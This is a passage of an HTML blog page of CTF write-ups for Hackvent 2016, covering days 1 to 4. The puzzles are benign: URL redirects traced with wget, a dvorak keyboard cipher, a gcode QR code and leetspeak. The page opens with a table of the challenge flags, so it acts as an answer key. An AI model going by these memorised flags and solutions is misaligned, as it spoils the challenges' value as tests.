@@ -1,0 +1,1849 @@
+<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Hackvent 2016" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups by team Galaxians." /><meta property="og:description" content="A set of CTF writeups by team Galaxians." /><link rel="canonical" href="https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2016/" /><meta property="og:url" content="https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2016/" /><meta property="og:site_name" content="Galaxians CTF" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2016-12-01T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackvent 2016" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-20T16:28:47+02:00","datePublished":"2016-12-01T00:00:00+01:00","description":"A set of CTF writeups by team Galaxians.","headline":"Hackvent 2016","mainEntityOfPage":{"@type":"WebPage","@id":"https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2016/"},"url":"https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2016/"}</script><title> Galaxians CTF | Hackvent 2016</title><link rel="apple-touch-icon" sizes="180x180" href="/CTF-writeups-public/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/CTF-writeups-public/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/CTF-writeups-public/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/CTF-writeups-public/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/CTF-writeups-public/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Galaxians CTF"><meta name="application-name" content="Galaxians CTF"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/CTF-writeups-public/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/CTF-writeups-public/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/CTF-writeups-public/" class="mx-auto"> <img src="/CTF-writeups-public/assets/img/galaxians-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/CTF-writeups-public/">Galaxians CTF</a></div><div class="site-subtitle font-italic">Galactic Girlfiends Hack the Universe!</div></div><ul class="w-100"><li class="nav-item"> <a href="/CTF-writeups-public/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/posts/" class="nav-link"> <i class="fa-fw fas fa-pencil ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/shiltemann" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['galaxians','galaxians.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/CTF-writeups-public/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/CTF-writeups-public/"> Home </a> </span> <span>Hackvent 2016</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Ctf-event</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> Hackvent 2016</h1><div class="post-content"><h1>Overview</h1><div class="table-wrapper"><div class="table-wrapper"><table><thead><tr><th>Challenge<th>Difficulty<th>Category<th>Flag<tbody><tr><td><a href="#hidden-balls">Hidden Balls</a><td><td><td><code>HV16-hSCk-DTwW-wnKr-yTVj-bOay</code><tr><td><a href="#dec-1-detours">Dec 1: Detours</a><td><td><td><code>HV16-t8Kd-38aY-QxL5-bn4K-c6Lw</code><tr><td><a href="#dec-2-free-giveaway">Dec 2: Free Giveaway</a><td><td><td><code>HV16-SDhs-qqpf-zQLp-OQH4-2Xmg</code><tr><td><a href="#dec-3-manufactory">Dec 3: Manufactory</a><td><td><td><code>HV16-oY2d-2Ki7-JBDe-VVdg-X8bW</code><tr><td><a href="#dec-4-language-of-us">Dec 4: Language of Us</a><td><td><td><code>HV16-O7oI-W34j-BJH7-cSvk-e5Hz</code><tr><td><a href="#dec-5-boolean-fun">Dec 5: Boolean Fun</a><td><td><td><code>HV16-2wGq-wOX3-T2oe-n8si-hZ0A</code><tr><td><a href="#dec-6-back-2-work">Dec 6: Back 2 Work</a><td><td><td><code>HV16-y9YO-sDo1-Vi7O-RWq1-V7hN</code><tr><td><a href="#dec-7-trivialkrypto-1-42">Dec 7: TrivialKRYPTO 1.42</a><td><td><td><code>HV16-bxuh-b3ep-1PCU-b9ft-CgVu</code><tr><td><a href="#dec-8-lost-in-encoding">Dec 8: Lost In Encoding</a><td><td><td><code>HV16-l0st-1n7r-4nsl-4710-n00b</code><tr><td><a href="#dec-9-illegal-prime-number">Dec 9: Illegal Prime Number</a><td><td><td><code>HV16-0228-d75b-40cd-8a0e-1f3e</code><tr><td><a href="#dec-10-i-want-to-play-a-game">Dec 10: I want to play a Game</a><td><td><td><code>HV16-Vm5y-NjgH-e7tW-PgMa-61JH</code><tr><td><a href="#dec-11-a-maze-ing-gift">Dec 11: A-maze-ing GIFt</a><td><td><td><code>HV16-otli-KbAg-MDVb-TMTO-WTDI</code><tr><td><a href="#dec-12-crypt-o-math">Dec 12: Crypt-o-Math</a><td><td><td><code>HV16-laWz-D5yT-0Uzb-DFj0-FIsL</code><tr><td><a href="#dec-13-jcoinz">Dec 13: JCoinz</a><td><td><td><code>HV16-y4h0-g00t-d33m-c01n-zzzz</code><tr><td><a href="#dec-14-radio-wargame">Dec 14: Radio Wargame</a><td><td><td><code>HV16-1337-Radi-oWar-game-1337</code><tr><td><a href="#dec-15-sap-santas-admin-panel">Dec 15: SAP - Santas Admin Panel</a><td><td><td><code>HV16-R41n-d33r-8yt3-Fl1p-H4ck</code><tr><td><a href="#dec-16-marshmallows">Dec 16: Marshmallows</a><td><td><td> unsolved<tr><td><a href="#dec-17-i-want-to-play-a-game">Dec 17: I want to play a Game</a><td><td><td> unsolved<tr><td><a href="#dec-19-zebra-code">Dec 19: Zebra Code</a><td><td><td> unsolved</table></div></div><h1 id="hidden-balls"> Hidden Balls <a href="/CTF-writeups-public/writeups/Hackvent_2016/00-hidden-balls.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>There were some easter eggs as well</p><p><strong>Hidden 1</strong> On dec 10 a message appeared</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Just wondering why #Thumper (@HackyEaster) isn't playing #HACKvent. Did you see him? Follow the rabbit !
+</pre></table></code></div></div><p>We go to that twitter account and find a <a href="https://twitter.com/HackyEaster/status/807510441605951489">tweet</a> with a ball</p><p><img src="writeupfiles/hidden1.jpg" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>HV16-hSCk-DTwW-wnKr-yTVj-bOay
+</pre></table></code></div></div><h2 id="hidden-2"><span class="mr-2">Hidden 2</span><a href="#hidden-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="hidden-3"><span class="mr-2">Hidden 3</span><a href="#hidden-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> HV16-hSCk-DTwW-wnKr-yTVj-bOay </code><hr><h1 id="dec-1-detours"> Dec 1: Detours <a href="/CTF-writeups-public/writeups/Hackvent_2016/01-dec-1-detours.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Santa receives an email with links to three pictures, but every picture is the same. He talks with some of his elves and one says, that there is some weird stuff happening when loading these pictures. Can you identify it?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>http://ow.ly/unCT306N19f
+http://ow.ly/xW3h306N18f
+http://ow.ly/3wfc306N10K
+</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>All three links lead to the same <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Intocht_van_Sinterklaas_in_Schiedam_2009_%284102602499%29_%282%29.jpg/220px-Intocht_van_Sinterklaas_in_Schiedam_2009_%284102602499%29_%282%29.jpg">image on wikipedia</a>:</p><p><img src="writeupfiles/sint.jpg" alt="" /></p><p>There must be something going on with the shortened urls. We get the images with <code class="language-plaintext highlighter-rouge">wget</code> for some more info:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>$ wget http://ow.ly/unCT306N19f
+
+Resolving ow.ly (ow.ly)... 54.183.131.91, 54.67.57.56, 54.67.62.204, ...
+Connecting to ow.ly (ow.ly)|54.183.131.91|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: http://bit.do/HV16-t8Kd [following]
+--2016-12-05 22:51:21--  http://bit.do/HV16-t8Kd
+Resolving bit.do (bit.do)... 54.83.52.76
+Connecting to bit.do (bit.do)|54.83.52.76|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Intocht_van_Sinterklaas_in_Schiedam_2009_%284102602499%29_%282%29.jpg/220px-Intocht_van_Sinterklaas_in_Schiedam_2009_%284102602499%29_%282%29.jpg [following]
+--2016-12-05 22:51:22--  https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Intocht_van_Sinterklaas_in_Schiedam_2009_%284102602499%29_%282%29.jpg/220px-Intocht_van_Sinterklaas_in_Schiedam_2009_%284102602499%29_%282%29.jpg
+Resolving upload.wikimedia.org (upload.wikimedia.org)... 91.198.174.208, 2620:0:862:ed1a::2:b
+Connecting to upload.wikimedia.org (upload.wikimedia.org)|91.198.174.208|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 21433 (21K) [image/jpeg]
+Saving to: ‘unCT306N19f’
+
+unCT306N19f         100%[===================&gt;]  20,93K  --.-KB/s    in 0,05s
+
+2016-12-05 22:51:22 (391 KB/s) - ‘unCT306N19f’ saved [21433/21433]
+</pre></table></code></div></div><p>Hmm, the <code class="language-plaintext highlighter-rouge">ow.ly</code> link resolves to <code class="language-plaintext highlighter-rouge">http://bit.do/HV16-t8Kd</code> this looks like the start of a nugget!</p><p>we do the same for the other two links and find</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>http://bit.do/38aY-QxL5
+http://bit.do/bn4K-c6Lw
+</pre></table></code></div></div><p>Putting it all together gives the nugget</p><h2 id="nugget"><span class="mr-2">Nugget</span><a href="#nugget" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>HV16-t8Kd-38aY-QxL5-bn4K-c6Lw
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-t8Kd-38aY-QxL5-bn4K-c6Lw </code><hr><h1 id="dec-2-free-giveaway"> Dec 2: Free Giveaway <a href="/CTF-writeups-public/writeups/Hackvent_2016/02-dec-2-free-giveaway.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>the keys are the key</em></p><p>Today, Santa has a free giveaway for you:</p><p><code class="language-plaintext highlighter-rouge">DK16[OEdo[''lu[;"Nl[R"D4[2Qmi</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Seems clear that that string represents the flag, vigenere cipher?</p><p><code class="language-plaintext highlighter-rouge">D</code> is 4th letter in alphabet, if you shift 4 further you get <code class="language-plaintext highlighter-rouge">H</code>, <code class="language-plaintext highlighter-rouge">K</code> is eleventh letter and if you shift 11 further you get <code class="language-plaintext highlighter-rouge">V</code> ..but how to handle special characters? <code class="language-plaintext highlighter-rouge">[</code> needs to be shifted to <code class="language-plaintext highlighter-rouge">-</code></p><p>This almost works..? (but seems too random to just exclude number and not keep ascii ordering of chars ..I dunno, it’s day 2, probably overthinking?)</p><p>hint is <em>the key is in the keys</em> ..maybe only shift those symbols that you need the shift key to type? (so leave lowercase and numbers as is, shift uppercase and some other symbols?)</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">string</span>
+
+<span class="n">flag</span><span class="o">=</span><span class="sh">"</span><span class="s">DK16[OEdo[</span><span class="sh">''</span><span class="s">lu[;</span><span class="se">\"</span><span class="s">Nl[R</span><span class="se">\"</span><span class="s">D4[2Qmi</span><span class="sh">"</span>
+<span class="n">alphabet</span><span class="o">=</span><span class="sh">"</span><span class="s">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789 !</span><span class="se">\"</span><span class="s">#$%&amp;</span><span class="se">\'</span><span class="s">()*+,-./:;&lt;=&gt;?@[</span><span class="se">\\</span><span class="s">]^_`{|}~ </span><span class="sh">"</span>
+
+<span class="n">pt</span><span class="o">=</span><span class="sh">''</span>
+<span class="n">count</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="ow">or</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">lowercase</span><span class="p">:</span>
+        <span class="n">pt</span><span class="o">+=</span><span class="n">c</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">pt</span> <span class="o">+=</span> <span class="n">alphabet</span><span class="p">[((</span><span class="n">alphabet</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="n">alphabet</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">count</span><span class="p">]))</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)]</span>
+    <span class="n">count</span> <span class="o">+=</span><span class="mi">1</span>
+
+<span class="k">print</span> <span class="n">pt</span>
+</pre></table></code></div></div><p>Turns out it is just a translation from qwerty to dvorak. Inverting that gives us the answer and explains the hint mentioning “keys”:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">maketrans</span>
+
+<span class="n">QWERTY</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">-=qwertyuiop[]sdfghjkl;</span><span class="sh">'</span><span class="s">zxcvbn,./_+QWERTYUIOP{}SDFGHJKL:</span><span class="sh">"</span><span class="s">ZXCVBN&lt;&gt;?</span><span class="sh">'''</span>
+<span class="n">DVORAK</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">[]</span><span class="sh">'</span><span class="s">,.pyfgcrl/=oeuidhtns-;qjkxbwvz{}</span><span class="sh">"</span><span class="s">&lt;&gt;PYFGCRL?+OEUIDHTNS_:QJKXBWVZ</span><span class="sh">'''</span>
+<span class="n">TRANS</span> <span class="o">=</span> <span class="nf">maketrans</span><span class="p">(</span><span class="n">DVORAK</span><span class="p">,</span> <span class="n">QWERTY</span><span class="p">)</span>
+
+<span class="n">flag</span><span class="o">=</span><span class="sh">"</span><span class="s">DK16[OEdo[</span><span class="sh">''</span><span class="s">lu[;</span><span class="se">\"</span><span class="s">Nl[R</span><span class="se">\"</span><span class="s">D4[2Qmi</span><span class="sh">"</span>
+
+<span class="k">print</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="n">x</span><span class="p">.</span><span class="nf">translate</span><span class="p">(</span><span class="n">TRANS</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">list</span><span class="p">(</span><span class="n">flag</span><span class="p">)])</span>
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-SDhs-qqpf-zQLp-OQH4-2Xmg </code><hr><h1 id="dec-3-manufactory"> Dec 3: Manufactory <a href="/CTF-writeups-public/writeups/Hackvent_2016/03-dec-3-manufactory.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Today’s gift is ready to be manufactured, but Santa’s afraid that his factory won’t manage to do a production run before christmas. But perhaps you can create it yourself?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The file was a gcode file for a 3d printer</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>; generated by Slic3r 1.2.9 on 2016-12-05 at 07:54:32
+
+; external perimeters extrusion width = 0.50mm
+; perimeters extrusion width = 0.72mm
+; infill extrusion width = 0.72mm
+; solid infill extrusion width = 0.72mm
+; top infill extrusion width = 0.72mm
+
+M107
+M104 S200 ; set temperature
+G28 ; home all axes
+G1 Z5 F5000 ; lift nozzle
+
+M109 S200 ; wait for temperature to be reached
+G21 ; set units to millimeters
+G90 ; use absolute coordinates
+M82 ; use absolute distances for extrusion
+
+...
+</pre></table></code></div></div><p>We can view this online at <a href="http://gcode.ws/">gcode.ws</a></p><p><img src="writeupfiles/gcode_qr.png" alt="" /></p><h2> Flag</h2><code> HV16-oY2d-2Ki7-JBDe-VVdg-X8bW </code><hr><h1 id="dec-4-language-of-us"> Dec 4: Language of Us <a href="/CTF-writeups-public/writeups/Hackvent_2016/04-dec-4-language-of-us.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You all should know this language, but this one is not that consequent as it should be.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>st3g4|/|o9ra|*h`/ !s 7he |*r4(t!ce 0f (0n(ea£i|/|9 a |=il3, m35s4ge, !m49e, 0r v!d30 w!th!n 4|/|o7he|2 f!£e, /v\es5a93, i/v\ag3, o|2 \'i|)eo. 7h3 \/\/o|2d s7e94n0gr4p|-|`/ c0mb!n35 t|-|e g|2e3|&lt; w0rd5 s73g4no5, m34n!ng "(o\'3r3d, c0n(3a£ed, 0r |*|2o7ec7e|)", 4n|) gr4p|-|3i|/| me4n!|/|g "\/\/ri7i|/|9".
+t|-|e f!r57 r3co|2d3|) u5e o|= t|-|3 t3rm \/\/a5 8y _|oh4n|/|3s 7ri7h3/v\i|_|s i|/| h!5 s7eg4n09r4ph!a, 4 7r3at!s3 0n (ry|*t09r4ph`/ a|/||) s7eg4n09r4ph`/, d!5g|_|is3d 45 a 8oo|&lt; o|/| /v\a9ic. 9e|/|3r4ll`/, t|-|3 h!dd3n /v\3s5ag3s 4|*p3ar 7o 83 s0me7h!|/|g 3ls3: i/v\4g3s, a|2t!(l3s, s|-|o|*|*i|/|g l!s75, o|2 so/v\e 07h3r c0v3|2 t3xt. |=o|2 3x4mp£e, 7|-|e |-|id|)e|/| /v\e5sa9e /v\4y 8e i|/| i|/|\'i5ib£e !|/|k 8et\/\/e3|/| t|-|e v!s!8l3 li|/|e5 0f 4 pr!v47e £et7e|2. 5o/v\e i/v\p£3m3nt4t!0n5 of 5t39a|/|og|2a|*|-|y 7ha7 l4(k 4 sh4r3|) s3cr3t 4|2e |=or/v\s 0|= s3cu|2i7`/ t|-|ro|_|g|-| 0b5cu|2i7`/, w|-|e|2ea5 key-d3p3n|)3nt s73gan0gr4|*h!( sch3m35 a|)h3re 70 |&lt;3rc|&lt;|-|o|=|=5's |*|2i|/|(!|*l3.
+th3 ad\'an7a93 o|= s7e9a|/|09ra|*|-|y o\'3r c|2`/p7ogr4|*h`/ a£one !s 7|-|a7 t|-|e int3nd3d s3c|2et /v\es5age do35 n07 4tt|2a(7 a7t3|/|tio|/| 7o !t5el|= 4s 4|/| 0b_|3ct 0|= s(r|_|7in`/. p£4i|/|l`/ \'is!b£e e|/|(r`/p7e|) me5sage5 - |/|0 /v\a7ter |-|o\/\/ |_|n8re4k48l3 - ar0u53 i|/|te|2e57, a|/|d m4y !|/| t|-|em5e£\'e5 be !n(|2i/v\in4t!|/|g !n c0u|/|7r!es \/\/h3|2e 3nc|2y|*7i0n i5 i££e9al. 7h|_|5, w|-|er3a5 (r`/pt0g|24p|-|y i5 t|-|3 p|2ac7i(3 o|= pr0t3(t!ng 7h3 (o|/|te|/|t5 0f 4 me5s49e 4lo|/|e, 57e9an0g|24p|-|y i5 c0|/|c3rn3d \/\/!t|-| co|/|c34l!ng 7h3 |=a(t t|-|a7 4 s3cr3t /v\3s5ag3 i5 8e!ng 5e|/|7, a5 we£l 45 c0nc3a£!n9 th3 c0|/|t3nt5 o|= 7h3 me5s49e.
+5te9a|/|0g|2ap|-|y !|/|c£ud3s 7|-|e (on(e4£m3nt 0f !|/|f0rm4t!0n \/\/it|-|i|/| (o/v\pu7e|2 |=i£es. !n |)!g!ta£ s73g4no9r4|*h`/, el3c7|2o|/|ic (o/v\/v\u|/|ic4t!0n5 ma`/ i|/|(l|_|de 5t39a|/|og|2a|*|-|i( co|)i|/|9 i|/|si|)e 0|= a 7ra|/|s|*0r7 la`/e|2, 5u(h a5 a |)0c|_|me|/|t |=!l3, im4g3 |=i£e, p|2o9|2a/v\ or |*r07o(ol. /v\e|)!a |=il3s 4|2e !de4l |=0r 5te9a|/|0g|2ap|-|i( 7r4ns/v\i55i0n b3c4|_|s3 of 7h3!r £ar9e 5!z3. fo|2 e&gt;&lt;4m|*le, 4 s3|/|d3r m!g|-|7 s7ar7 w!7h 4n i|/|n0(u0us !m49e |=il3 a|/||) a|)ju5t 7|-|e (ol0r 0|= e\'er`/ h|_||/|d|2ed7h |*!x3l t0 c0|2r3sp0n|) 7o 4 le7t3|2 i|/| th3 a£|*h4be7, a (|-|a|/|ge 5o 5|_|b7le 7h47 s0me0n3 |/|o7 sp3c!|=i(al£y £0o|&lt;in9 f0|2 i7 is |_|n£!k3ly 7o |/|0t!ce !t.
+</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This leetspeak reads:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>Steganography is the practice of concealing a file, message, image, or video within another file, message, image, or video. The word steganography combines the greek words steganos, meaning "covered, concealed, or protected", and graphein meaning "writing".
+The first recorded use of the term was by johannes trithemi|js in his steganographia, a treatise on cryptography and steganography, disguised as a book on magic. generally, the hidden messages appear to be something else: images, articles, shopping lists, or some other cover text. for example, the hidden message may be in invisible ink between the visible lines of a private letter. some implementations of steganography that lack a shared secret are forms of security through obscurity, whereas key-dependent steganographic schemes adhere to kerckhoffs's principle.
